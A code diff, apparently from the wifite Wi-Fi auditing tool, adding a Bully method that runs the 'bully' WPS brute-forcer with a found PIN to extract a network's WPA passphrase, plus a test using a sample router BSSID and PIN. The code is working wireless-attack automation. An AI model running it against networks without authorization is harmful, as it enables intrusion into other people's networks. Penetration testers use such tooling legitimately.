@@ -2,12 +2,12 @@
 # -*- coding: utf-8 -*-
 
 from ..model.attack import Attack
+from ..model.wps_result import CrackResultWPS
 from ..tools.airodump import Airodump
 from ..util.color import Color
 from ..util.timer import Timer
 from ..util.process import Process
 from ..config import Configuration
-from ..model.wps_result import CrackResultWPS
 
 import os, time, re
 from threading import Thread
@@ -214,7 +214,48 @@ class Bully(Attack):
     def __del__(self):
         self.stop()
 
+    @staticmethod
+    def get_psk_from_pin(target, pin):
+        '''
+        bully --channel 1 --bssid 34:21:09:01:92:7C --pin 01030365 --bruteforce wlan0mon
+        PIN   : '01030365'
+        KEY   : 'password'
+        BSSID : '34:21:09:01:92:7c'
+        ESSID : 'AirLink89300'
+        '''
+        Color.pl('\n{+} found PIN: {G}%s{W}' % pin)
+        Color.p('{+} fetching {C}PSK{W} using {C}bully{W}... ')
+        cmd = [
+            'bully',
+            '--channel', target.channel,
+            '--bssid', target.bssid,
+            '--pin', pin,
+            '--bruteforce',
+            Configuration.interface
+        ]
+
+        bully_proc = Process(cmd)
+
+        for line in bully_proc.stderr().split('\n'):
+            key_re = re.search(r"^\s*KEY\s*:\s*'(.*)'\s*$", line)
+            if key_re is not None:
+                psk = key_re.group(1)
+                Color.pl('{W}found PSK: {G}%s{W}' % psk)
+                return psk
+
+        Color.pl('{R}failed{W}')
+        return None
+
 if __name__ == '__main__':
+    Configuration.initialize()
+    Configuration.interface = 'wlan0mon'
+    from ..model.target import Target
+    fields = '34:21:09:01:92:7C,2015-05-27 19:28:44,2015-05-27 19:28:46,1,54,WPA2,CCMP TKIP,PSK,-58,2,0,0.0.0.0,9,AirLink89300,'.split(',')
+    target = Target(fields)
+    psk = Bully.get_psk_from_pin(target, '01030365')
+    print "psk", psk
+
+    '''
     stdout = " [*] Pin is '11867722', key is '9a6f7997'"
     Configuration.initialize(False)
     from ..model.target import Target
@@ -222,3 +263,4 @@ if __name__ == '__main__':
     target = Target(fields)
     b = Bully(target)
     b.parse_line(stdout)
+    '''
